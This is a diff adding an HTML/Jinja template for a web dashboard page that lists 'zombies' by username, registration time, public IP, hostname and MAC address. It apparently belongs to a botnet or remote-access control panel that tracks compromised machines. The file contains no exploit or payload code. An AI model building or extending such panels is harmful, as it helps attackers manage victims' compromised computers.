@@ -1,0 +1,58 @@
+
+
+{% extends "dashboard/base_dashboard.html" %}
+
+{% block panel_window %}
+
+{% with window_type = 'filter', data_type = 'zombies', filter_by_time = True %}
+    {% include 'windows/filter-window.html' %}
+{% endwith %}
+
+
+<!--close panel div-->
+</div>
+<!--close navbar div-->
+</div>
+
+{% if data %}
+<div class="panel-info">
+<div class="window" id="zombies-results" style="background-color: grey;">
+  <div class="title-bar">
+    <div class="title-bar-text"><img style="display: inline; margin-right: 5px; margin-left: 3px; vertical-align:middle;" height="3%" width="3%" src="{{ url_for('static', filename='img/an-skull.gif') }}" />zombies.xlsx</div>
+    <div class="title-bar-controls">
+      <button aria-label="Minimize" onclick="toggleMinimize('zombies-results-body')"></button>
+      <button aria-label="Maximize"></button>
+      <button aria-label="Close" onclick="document.getElementById('zombies-results').remove()"></button>
+    </div>
+  </div>
+  <div class="window-body" id="zombies-results-body">
+    <div id="zombies-data">
+        <table class="darkTable">
+            <thead>
+            <tr>
+                <th>username</th>
+                <th>registered_at</th>
+                <th>public IP</th>
+                <th>hostname</th>
+                <th>MAC address</th>
+            </tr>
+            </thead>
+            <tbody>
+            {% for zombie in data %}
+            <tr>
+                <td>{{ zombie['username'] }}</td>
+                <td>{{ zombie['registered_at'] }}</td>
+                <td>{{ zombie['current_public_ip'] }}</td>
+                <td>{{ zombie['current_hostname'] }}</td>
+                <td>{{ zombie['current_mac_addr'] }}</td>
+            </tr>
+            {% endfor %}
+            </tbody>
+        </table>
+    </div>
+  </div>
+</div>
+</div>
+{% endif %}
+
+{% endblock %}
